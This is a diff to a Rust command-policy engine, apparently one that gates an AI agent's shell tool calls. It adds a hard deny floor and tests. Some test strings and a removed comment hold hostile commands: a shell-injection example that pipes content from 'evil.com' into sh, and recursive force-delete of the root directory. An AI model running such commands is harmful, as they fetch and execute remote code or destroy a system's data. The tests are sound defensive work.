@@ -28,18 +28,13 @@ pub struct RulePolicy {
 
 impl PolicyEngine for RulePolicy {
     fn check(&self, intent: &ToolIntent) -> Decision {
-        // Commands are judged by allow/deny lists first.
+        // Commands are judged by the parse-then-classify policy (see `command.rs`):
+        // a two-layer hard floor first, then a deny-by-default auto-allow gate.
         if let Some(cmd) = &intent.command {
-            if self.command_denylist.iter().any(|d| cmd.contains(d.as_str())) {
-                return Decision::Deny(format!("command matches denylist: {cmd}"));
+            if let Some(reason) = crate::command::hard_floor_violation(cmd, &self.command_denylist) {
+                return Decision::Deny(reason);
             }
-            // A command is auto-allowed only if its first token is allowlisted AND it
-            // contains no shell metacharacters — otherwise `sh -c` could run more than
-            // the vetted program (e.g. `ls && curl evil.com | sh`), so require approval.
-            const SHELL_META: &[char] = &[';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\\'];
-            let first = cmd.split_whitespace().next().unwrap_or("");
-            let has_meta = cmd.contains(|c: char| SHELL_META.contains(&c));
-            if !has_meta && self.command_allowlist.iter().any(|a| a == first) {
+            if crate::command::is_auto_allowed(cmd, &self.command_allowlist) {
                 return Decision::Allow;
             }
             return Decision::Ask;
@@ -120,5 +115,29 @@ mod tests {
     fn allowlisted_command_with_semicolon_asks() {
         assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("cat x; curl evil.com"))),
             Decision::Ask));
+    }
+
+    #[test]
+    fn floor_denies_rm_variants_through_check() {
+        for cmd in ["rm -fr /", "rm --recursive --force /", "rm -rf  /"] {
+            assert!(matches!(policy().check(&intent(Access::Write, vec![], Some(cmd))),
+                Decision::Deny(_)), "expected Deny for {cmd}");
+        }
+    }
+
+    #[test]
+    fn metachar_commands_ask_through_check() {
+        for cmd in ["cat {a,b}", "ls *", "cat ~/x"] {
+            assert!(matches!(policy().check(&intent(Access::Write, vec![], Some(cmd))),
+                Decision::Ask), "expected Ask for {cmd}");
+        }
+    }
+
+    #[test]
+    fn clean_allowlisted_still_allows_through_check() {
+        assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("ls -la"))),
+            Decision::Allow));
+        assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("git status"))),
+            Decision::Allow));
     }
 }
